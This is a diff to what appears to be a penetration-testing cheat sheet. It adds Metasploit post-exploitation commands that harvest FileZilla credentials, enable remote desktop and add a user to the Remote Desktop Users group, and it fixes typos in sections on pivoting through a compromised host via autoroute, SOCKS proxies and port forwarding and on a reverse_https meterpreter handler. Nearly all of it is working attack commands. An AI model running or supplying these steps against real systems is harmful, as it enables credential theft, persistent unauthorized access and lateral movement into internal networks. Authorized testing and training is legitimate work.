@@ -881,6 +881,9 @@ meterpreter > run post/windows/gather/credentials/winscp
 meterpreter > run post/windows/gather/credential_collector
 meterpreter > search -f *kdb -r -d .
 meterpreter > screenshot
+meterpreter > run post/multi/gather/filezilla_client_cred
+meterpreter > run getgui -e
+net localgroup "Remote Desktop Users" bruiser /add
 ```
 ##### Maping the Internal Network
 ```bash
@@ -888,10 +891,11 @@ arp
 route
 ipconfig /displaydns
 netstat -ano
-use /post/multi/gather/ping_sweet
+use /post/multi/gather/ping_sweep
 run arp_scanner -r 10.10.10.0/24
-
-USE THE EXPLOITED MACHINE AS A BRIDGE
+```
+### USE THE EXPLOITED MACHINE AS A BRIDGE
+```bash
 use post/windows/manage/autoroute
 route print
 use auxiliary/server/socks4a
@@ -902,9 +906,12 @@ proxychains iceweasel (for browser)
 
 ADD PORT FORWARD RULE
 meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.200 (or whatever you want to get to)
+
+OR
+meterpreter > run autoroute -s 10.32.121.0/24
 ```
 
-### MAchine cant reach back over internet
+### Machine cant reach back over internet
 ```bash
 use post/windows/manage/autoroute
 set session 1
@@ -922,7 +929,7 @@ Active Routing Table
  10.10.10.0      255.255.255.0    Session 1
  10.10.11.0      255.255.255.0    Session 1
 
-Now cahnge LHOST to vicim 1
+Now change LHOST to vicim 1
 ```
 ##### Custom SSL Meterpreter
 ```bash
@@ -938,5 +945,4 @@ use exploit/multi/handler
 set handlersscert ctrl c path to .pem
 set stagerverifysslcert true
 set payload windows/x64.meterpreter/reverse_https
-
 ```
